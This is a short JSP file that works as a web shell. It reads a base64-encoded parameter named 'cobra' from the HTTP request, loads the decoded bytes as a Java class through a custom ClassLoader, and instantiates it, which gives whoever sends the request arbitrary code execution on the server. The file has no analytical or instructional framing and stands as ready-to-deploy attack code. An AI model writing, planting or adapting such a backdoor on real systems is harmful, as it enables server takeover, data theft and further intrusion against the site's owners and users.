<%@page
    import="java.util.*,java.io.*,javax.crypto.*,javax.xml.bind.*,java.nio.ByteBuffer,javax.crypto.spec.*,java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set"%><%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
              return super.defineClass(null, b, 0, b.length);
        }
    }%>
<%
		try {
		String cobra = request.getParameter("cobra");
   		cobra = new String(cobra.trim().getBytes("ISO-8859-1"), "UTF-8");  
		new U(this.getClass().getClassLoader()).g(DatatypeConverter.parseBase64Binary(cobra)).newInstance().toString();   
		} catch (Exception e) {
            e.printStackTrace();
        }               
%>
